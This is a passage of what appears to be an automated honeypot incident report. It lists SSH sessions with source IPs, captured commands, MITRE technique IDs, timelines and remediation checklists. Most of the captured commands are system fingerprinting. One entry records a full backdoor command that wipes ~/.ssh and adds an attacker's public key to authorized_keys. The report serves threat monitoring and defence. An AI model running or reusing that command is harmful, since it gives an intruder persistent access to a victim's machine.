- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2ca7daf68ec

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 18:22 |
| **Last Seen** | 2026-06-30 18:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:22:30` | `cowrie.session.connect` |
| `2026-06-30 18:22:31` | `cowrie.client.version` |
| `2026-06-30 18:22:31` | `cowrie.client.kex` |
| `2026-06-30 18:22:34` | `cowrie.login.success` |
| `2026-06-30 18:22:36` | `cowrie.session.params` |
| `2026-06-30 18:22:36` | `cowrie.command.input` |
| `2026-06-30 18:22:37` | `cowrie.log.closed` |
| `2026-06-30 18:22:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5470f535f9dc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-06-30 18:23 |
| **Last Seen** | 2026-06-30 18:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:23:54` | `cowrie.session.connect` |
| `2026-06-30 18:23:54` | `cowrie.client.version` |
| `2026-06-30 18:23:54` | `cowrie.client.kex` |
| `2026-06-30 18:23:57` | `cowrie.login.success` |
| `2026-06-30 18:23:58` | `cowrie.session.params` |
| `2026-06-30 18:23:58` | `cowrie.command.input` |
| `2026-06-30 18:23:58` | `cowrie.command.input` |
| `2026-06-30 18:23:58` | `cowrie.command.input` |
| `2026-06-30 18:23:58` | `cowrie.command.input` |
| `2026-06-30 18:23:58` | `cowrie.command.input` |
| `2026-06-30 18:23:58` | `cowrie.command.success` |
| `2026-06-30 18:23:58` | `cowrie.command.input` |
| `2026-06-30 18:23:58` | `cowrie.command.input` |
| `2026-06-30 18:23:58` | `cowrie.command.input` |
| `2026-06-30 18:23:58` | `cowrie.command.input` |
| `2026-06-30 18:23:59` | `cowrie.log.closed` |
| `2026-06-30 18:24:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbc060dc1868

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-06-30 18:26 |
| **Last Seen** | 2026-06-30 18:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:26:02` | `cowrie.session.connect` |
| `2026-06-30 18:26:03` | `cowrie.client.version` |
| `2026-06-30 18:26:03` | `cowrie.client.kex` |
| `2026-06-30 18:26:05` | `cowrie.login.success` |
| `2026-06-30 18:26:07` | `cowrie.session.params` |
| `2026-06-30 18:26:07` | `cowrie.command.input` |
| `2026-06-30 18:26:07` | `cowrie.command.input` |
| `2026-06-30 18:26:07` | `cowrie.command.input` |
| `2026-06-30 18:26:07` | `cowrie.command.input` |
| `2026-06-30 18:26:07` | `cowrie.command.input` |
| `2026-06-30 18:26:07` | `cowrie.command.success` |
| `2026-06-30 18:26:07` | `cowrie.command.input` |
| `2026-06-30 18:26:07` | `cowrie.command.input` |
| `2026-06-30 18:26:07` | `cowrie.command.input` |
| `2026-06-30 18:26:07` | `cowrie.command.input` |
| `2026-06-30 18:26:07` | `cowrie.log.closed` |
| `2026-06-30 18:26:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe0a8078e6cb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-06-30 18:30 |
| **Last Seen** | 2026-06-30 18:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:30:13` | `cowrie.session.connect` |
| `2026-06-30 18:30:14` | `cowrie.client.version` |
| `2026-06-30 18:30:14` | `cowrie.client.kex` |
| `2026-06-30 18:30:16` | `cowrie.login.success` |
| `2026-06-30 18:30:18` | `cowrie.session.params` |
| `2026-06-30 18:30:18` | `cowrie.command.input` |
| `2026-06-30 18:30:18` | `cowrie.command.input` |
| `2026-06-30 18:30:18` | `cowrie.command.input` |
| `2026-06-30 18:30:18` | `cowrie.command.input` |
| `2026-06-30 18:30:18` | `cowrie.command.input` |
| `2026-06-30 18:30:18` | `cowrie.command.success` |
| `2026-06-30 18:30:18` | `cowrie.command.input` |
| `2026-06-30 18:30:18` | `cowrie.command.input` |
| `2026-06-30 18:30:18` | `cowrie.command.input` |
| `2026-06-30 18:30:18` | `cowrie.command.input` |
| `2026-06-30 18:30:18` | `cowrie.log.closed` |
| `2026-06-30 18:30:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-343c9920b1a3

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 18:30 |
| **Last Seen** | 2026-06-30 18:31 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:30:51` | `cowrie.session.connect` |
| `2026-06-30 18:30:53` | `cowrie.client.version` |
| `2026-06-30 18:30:53` | `cowrie.client.kex` |
| `2026-06-30 18:30:59` | `cowrie.login.success` |
| `2026-06-30 18:31:03` | `cowrie.session.params` |
| `2026-06-30 18:31:03` | `cowrie.command.input` |
| `2026-06-30 18:31:04` | `cowrie.log.closed` |
| `2026-06-30 18:31:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a97d43ab9de

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-06-30 18:32 |
| **Last Seen** | 2026-06-30 18:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:32:17` | `cowrie.session.connect` |
| `2026-06-30 18:32:18` | `cowrie.client.version` |
| `2026-06-30 18:32:18` | `cowrie.client.kex` |
| `2026-06-30 18:32:19` | `cowrie.login.success` |
| `2026-06-30 18:32:21` | `cowrie.session.params` |
| `2026-06-30 18:32:21` | `cowrie.command.input` |
| `2026-06-30 18:32:21` | `cowrie.command.input` |
| `2026-06-30 18:32:21` | `cowrie.command.input` |
| `2026-06-30 18:32:21` | `cowrie.command.input` |
| `2026-06-30 18:32:21` | `cowrie.command.input` |
| `2026-06-30 18:32:21` | `cowrie.command.success` |
| `2026-06-30 18:32:21` | `cowrie.command.input` |
| `2026-06-30 18:32:21` | `cowrie.command.input` |
| `2026-06-30 18:32:21` | `cowrie.command.input` |
| `2026-06-30 18:32:21` | `cowrie.command.input` |
| `2026-06-30 18:32:22` | `cowrie.log.closed` |
| `2026-06-30 18:32:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98526c99f0ac

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-06-30 18:34 |
| **Last Seen** | 2026-06-30 18:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:34:17` | `cowrie.session.connect` |
| `2026-06-30 18:34:18` | `cowrie.client.version` |
| `2026-06-30 18:34:18` | `cowrie.client.kex` |
| `2026-06-30 18:34:19` | `cowrie.login.success` |
| `2026-06-30 18:34:21` | `cowrie.session.params` |
| `2026-06-30 18:34:21` | `cowrie.command.input` |
| `2026-06-30 18:34:21` | `cowrie.command.input` |
| `2026-06-30 18:34:21` | `cowrie.command.input` |
| `2026-06-30 18:34:21` | `cowrie.command.input` |
| `2026-06-30 18:34:21` | `cowrie.command.input` |
| `2026-06-30 18:34:21` | `cowrie.command.success` |
| `2026-06-30 18:34:21` | `cowrie.command.input` |
| `2026-06-30 18:34:21` | `cowrie.command.input` |
| `2026-06-30 18:34:21` | `cowrie.command.input` |
| `2026-06-30 18:34:21` | `cowrie.command.input` |
| `2026-06-30 18:34:21` | `cowrie.log.closed` |
| `2026-06-30 18:34:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-714eb6d52c4d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-06-30 18:36 |
| **Last Seen** | 2026-06-30 18:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:36:19` | `cowrie.session.connect` |
| `2026-06-30 18:36:19` | `cowrie.client.version` |
| `2026-06-30 18:36:19` | `cowrie.client.kex` |
| `2026-06-30 18:36:21` | `cowrie.login.success` |
| `2026-06-30 18:36:22` | `cowrie.session.params` |
| `2026-06-30 18:36:22` | `cowrie.command.input` |
| `2026-06-30 18:36:22` | `cowrie.command.input` |
| `2026-06-30 18:36:22` | `cowrie.command.input` |
| `2026-06-30 18:36:22` | `cowrie.command.input` |
| `2026-06-30 18:36:22` | `cowrie.command.input` |
| `2026-06-30 18:36:22` | `cowrie.command.success` |
| `2026-06-30 18:36:22` | `cowrie.command.input` |
| `2026-06-30 18:36:22` | `cowrie.command.input` |
| `2026-06-30 18:36:22` | `cowrie.command.input` |
| `2026-06-30 18:36:22` | `cowrie.command.input` |
| `2026-06-30 18:36:22` | `cowrie.log.closed` |
| `2026-06-30 18:36:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0518d3fd5099

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 18:38 |
| **Last Seen** | 2026-06-30 18:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:38:17` | `cowrie.session.connect` |
| `2026-06-30 18:38:17` | `cowrie.client.version` |
| `2026-06-30 18:38:17` | `cowrie.client.kex` |
| `2026-06-30 18:38:19` | `cowrie.login.success` |
| `2026-06-30 18:38:21` | `cowrie.session.params` |
| `2026-06-30 18:38:21` | `cowrie.command.input` |
| `2026-06-30 18:38:22` | `cowrie.log.closed` |
| `2026-06-30 18:38:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba546216de4a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-06-30 18:38 |
| **Last Seen** | 2026-06-30 18:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:38:24` | `cowrie.session.connect` |
| `2026-06-30 18:38:24` | `cowrie.client.version` |
| `2026-06-30 18:38:24` | `cowrie.client.kex` |
| `2026-06-30 18:38:25` | `cowrie.login.success` |
| `2026-06-30 18:38:27` | `cowrie.session.params` |
| `2026-06-30 18:38:27` | `cowrie.command.input` |
| `2026-06-30 18:38:27` | `cowrie.command.input` |
| `2026-06-30 18:38:27` | `cowrie.command.input` |
| `2026-06-30 18:38:27` | `cowrie.command.input` |
| `2026-06-30 18:38:27` | `cowrie.command.input` |
| `2026-06-30 18:38:27` | `cowrie.command.success` |
| `2026-06-30 18:38:27` | `cowrie.command.input` |
| `2026-06-30 18:38:27` | `cowrie.command.input` |
| `2026-06-30 18:38:27` | `cowrie.command.input` |
| `2026-06-30 18:38:27` | `cowrie.command.input` |
| `2026-06-30 18:38:27` | `cowrie.log.closed` |
| `2026-06-30 18:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4306b961521

| Field | Detail |
|---|---|
| **Source IP** | `115.190.51[.]71` |
| **First Seen** | 2026-06-30 18:39 |
| **Last Seen** | 2026-06-30 18:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:39:29` | `cowrie.session.connect` |
| `2026-06-30 18:39:29` | `cowrie.client.version` |
| `2026-06-30 18:39:29` | `cowrie.client.kex` |
| `2026-06-30 18:39:30` | `cowrie.login.success` |
| `2026-06-30 18:39:32` | `cowrie.session.params` |
| `2026-06-30 18:39:32` | `cowrie.command.input` |
| `2026-06-30 18:39:32` | `cowrie.command.failed` |
| `2026-06-30 18:39:32` | `cowrie.log.closed` |
| `2026-06-30 18:39:33` | `cowrie.session.params` |
| `2026-06-30 18:39:33` | `cowrie.command.input` |
| `2026-06-30 18:39:33` | `cowrie.session.file_download` |
| `2026-06-30 18:39:33` | `cowrie.log.closed` |
| `2026-06-30 18:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.51[.]71` to AbuseIPDB if not already reported
- [ ] Block `115.190.51[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f63565f1c158

| Field | Detail |
|---|---|
| **Source IP** | `115.190.51[.]71` |
| **First Seen** | 2026-06-30 18:39 |
| **Last Seen** | 2026-06-30 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:39:34` | `cowrie.session.connect` |
| `2026-06-30 18:39:34` | `cowrie.client.version` |
| `2026-06-30 18:39:34` | `cowrie.client.kex` |
| `2026-06-30 18:39:35` | `cowrie.login.success` |
| `2026-06-30 18:39:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.51[.]71` to AbuseIPDB if not already reported
- [ ] Block `115.190.51[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6c8484e7bf5

| Field | Detail |
|---|---|
| **Source IP** | `115.190.51[.]71` |
| **First Seen** | 2026-06-30 18:39 |
| **Last Seen** | 2026-06-30 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:39:36` | `cowrie.session.connect` |
| `2026-06-30 18:39:36` | `cowrie.client.version` |
| `2026-06-30 18:39:36` | `cowrie.client.kex` |
| `2026-06-30 18:39:37` | `cowrie.login.success` |
| `2026-06-30 18:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.51[.]71` to AbuseIPDB if not already reported
- [ ] Block `115.190.51[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e85359915d6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-06-30 18:40 |
| **Last Seen** | 2026-06-30 18:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:40:33` | `cowrie.session.connect` |
| `2026-06-30 18:40:33` | `cowrie.client.version` |
| `2026-06-30 18:40:33` | `cowrie.client.kex` |
| `2026-06-30 18:40:35` | `cowrie.login.success` |
| `2026-06-30 18:40:36` | `cowrie.session.params` |
| `2026-06-30 18:40:36` | `cowrie.command.input` |
| `2026-06-30 18:40:36` | `cowrie.command.input` |
| `2026-06-30 18:40:36` | `cowrie.command.input` |
| `2026-06-30 18:40:36` | `cowrie.command.input` |
| `2026-06-30 18:40:36` | `cowrie.command.input` |
| `2026-06-30 18:40:36` | `cowrie.command.success` |
| `2026-06-30 18:40:36` | `cowrie.command.input` |
| `2026-06-30 18:40:36` | `cowrie.command.input` |
| `2026-06-30 18:40:36` | `cowrie.command.input` |
| `2026-06-30 18:40:36` | `cowrie.command.input` |
| `2026-06-30 18:40:36` | `cowrie.log.closed` |
| `2026-06-30 18:40:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0d563d670c0

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-06-30 18:42 |
| **Last Seen** | 2026-06-30 18:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:42:24` | `cowrie.session.connect` |
| `2026-06-30 18:42:24` | `cowrie.client.version` |
| `2026-06-30 18:42:24` | `cowrie.client.kex` |
| `2026-06-30 18:42:24` | `cowrie.login.success` |
| `2026-06-30 18:42:25` | `cowrie.session.params` |
| `2026-06-30 18:42:25` | `cowrie.command.input` |
| `2026-06-30 18:42:25` | `cowrie.log.closed` |
| `2026-06-30 18:42:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2ce724a0a32

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 18:42 |
| **Last Seen** | 2026-06-30 18:42 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:42:30` | `cowrie.session.connect` |
| `2026-06-30 18:42:32` | `cowrie.client.version` |
| `2026-06-30 18:42:32` | `cowrie.client.kex` |
| `2026-06-30 18:42:37` | `cowrie.login.success` |
| `2026-06-30 18:42:42` | `cowrie.session.params` |
| `2026-06-30 18:42:42` | `cowrie.command.input` |
| `2026-06-30 18:42:43` | `cowrie.log.closed` |
| `2026-06-30 18:42:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

